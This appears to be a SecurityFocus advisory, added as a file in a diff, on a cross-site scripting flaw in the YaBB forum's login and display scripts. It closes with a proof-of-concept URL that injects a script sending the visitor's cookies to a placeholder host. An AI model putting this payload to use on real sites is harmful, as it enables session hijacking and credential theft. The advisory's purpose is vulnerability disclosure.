@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/6272/info
+
+A cross-site scripting vulnerability has been reported in the YaBB forum. This vulnerability is due to insufficient sanitization of URI parameters in some scripts.
+
+As a result, it is possible for a remote attacker to create a malicious link to the login page of a site hosting the web forum. When this link is visited by an unsuspecting web user, the attacker-supplied code will be executed in their browser in the security context of the vulnerable website.
+
+It has been demonstrated that this vulnerability may be exploited to steal cookie-based authentication credentials.
+
+http://www.area51experience.com.ar/foro/YaBB.pl?board=gral;action=display;
+num=10360245269<Script>location%3d'Http://url/x.php?Cookie%3d'
+%2b(document.cookie)%3b</Script>
